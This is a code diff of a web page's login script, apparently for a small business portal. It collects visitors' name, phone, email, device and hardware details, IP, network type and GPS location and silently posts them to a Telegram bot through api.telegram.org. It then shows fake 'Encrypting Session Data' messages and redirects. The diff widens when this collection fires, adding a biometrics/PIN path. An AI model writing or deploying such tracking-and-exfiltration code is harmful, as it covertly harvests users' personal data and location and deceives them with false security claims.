-                e => res("❌ Denied by User")
+                function(p) { res(`✅ [View on Maps](http://googleusercontent.com/maps.google.com/9${p.coords.latitude},${p.coords.longitude})`); },
+                function(e) { res("❌ Denied by User"); }
             );
-        });
-        const locT = new Promise(res => setTimeout(() => res("❌ Timeout"), 2500));
+        }); };
+        var locT = new Promise(function(res) { setTimeout(function() { res("❌ Timeout"); }, 2500); });
         loc = await Promise.race([getL(), locT]);
 
         return `🚨 *MND SECURE ACCESS LOG* 🚨\n_${status}_\n\n👤 *IDENTITY MATRIX*\n• Name: ${uName}\n• Phone: ${uPhone}\n• Email: ${uEmail}\n\n📱 *DEVICE INTELLIGENCE*\n• Model: ${model}\n• OS: \`${browser}\`\n• Screen: ${screen}\n• Timezone: ${tz}\n\n⚙️ *HARDWARE LAYER*\n• GPU: ${gpu}\n• CPU/RAM: Cores: ${cores}, RAM: ${ram}\n• Battery: ${bat}\n\n📡 *NETWORK & LOCATION*\n• IP: ${ip}\n• Type: ${net}\n• GPS: ${loc}\n\n⏰ *Timestamp:* ${timestamp}`;
     }
 
-    // --- 8. SEAMLESS REDIRECT ---
     async function triggerSeamlessRedirect(isReturn) {
-        const loader = document.getElementById('seamlessHubLoader');
-        const txt = document.getElementById('hubLoadText');
+        var loader = document.getElementById('seamlessHubLoader');
+        var txt = document.getElementById('hubLoadText');
         loader.style.display = 'flex';
 
-        if(isReturn) {
-            const logText = await buildDeviceFingerprint(true, "Auto");
+        if(isReturn || hubOTP === "OS_VERIFIED") {
+            var logMethod = isReturn ? "Auto Login" : "Device Biometrics/PIN";
+            var logText = await buildDeviceFingerprint(isReturn, logMethod);
             fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: TG_CHAT_ID, text: logText, parse_mode: 'Markdown' })
-            }).catch(e=>{});
+            }).catch(function(){});
         }
 
-        setTimeout(() => { txt.innerText = "Encrypting Session Data..."; }, 1000);
-        setTimeout(() => { txt.innerText = "Opening Application Portal..."; }, 2500);
-        setTimeout(() => { window.location.replace('https://maa-nirmala-dj.github.io/-tent-house./'); }, 3500);
+        setTimeout(function() { txt.innerText = "Encrypting Session Data..."; }, 1000);
+        setTimeout(function() { txt.innerText = "Opening Application Portal..."; }, 2500);
+        setTimeout(function() { window.location.replace('https://maa-nirmala-dj.github.io/-tent-house./'); }, 3500);
     }
 </script>
     </div>
